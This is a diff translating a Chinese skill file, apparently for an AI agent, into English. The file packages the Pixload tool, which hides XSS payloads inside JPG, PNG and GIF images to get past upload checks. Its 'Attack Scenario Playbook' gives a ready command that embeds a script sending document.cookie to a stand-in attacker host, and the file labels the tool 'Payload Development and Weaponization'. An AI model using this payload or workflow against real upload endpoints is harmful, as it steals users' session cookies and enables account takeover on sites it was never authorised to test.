@@ -2,38 +2,41 @@
 name: pixload-image-payload
 description: "Image upload XSS and content-check bypass. Signals: payload development, weaponization, PNG injection, GIF injection."
 zh-signals: "Pixload: 图片上传 XSS/内容检查绕过。信号:载荷开发,武器化,PNG 注入,GIF 注入。"
+when-to-use: >-
+  Use when you need to build image files that carry XSS payloads for upload testing,
+  bypassing content-type or image validation while keeping the file renderable.
 ---
 
 # Pixload
 
-- 攻击大类:C07 载荷开发与武器化
-- 上游仓库:https://github.com/chinarulezzz/pixload
-- 上游 License:WTFPL(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C07 Payload Development and Weaponization
+- Upstream Repository: https://github.com/chinarulezzz/pixload
+- Upstream License: WTFPL (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/chinarulezzz/pixload && cd pixload && make
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./pixload-jpg payload.jpg` | JPG 注入 payload |
-| `./pixload-png out.png` | PNG 注入 |
-| `./pixload-gif out.gif` | GIF 注入 |
-| `-x 'alert(1)'` | 自定义 JS payload |
+| `./pixload-jpg payload.jpg` | Inject payload into JPG |
+| `./pixload-png out.png` | PNG injection |
+| `./pixload-gif out.gif` | GIF injection |
+| `-x 'alert(1)'` | Custom JS payload |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### 图片上传 XSS/内容检查绕过
+### Image upload XSS / content-check bypass
 
 ```bash
 ./pixload-jpg photo.jpg -x '<script>fetch("//attacker/?c="+document.cookie)</script>'
-# 上传到目标后,图片被直接展示时触发 XSS
+# After uploading to the target, XSS triggers when the image is rendered directly
 ```
 
-## 注意事项
+## Notes
 
-向图片二进制注入 payload 且不破环图片可显示性;用于绕过上传内容检测与被动 XSS。
+Injects a payload into the image binary without breaking its displayability; used to bypass upload content checks and passive XSS.
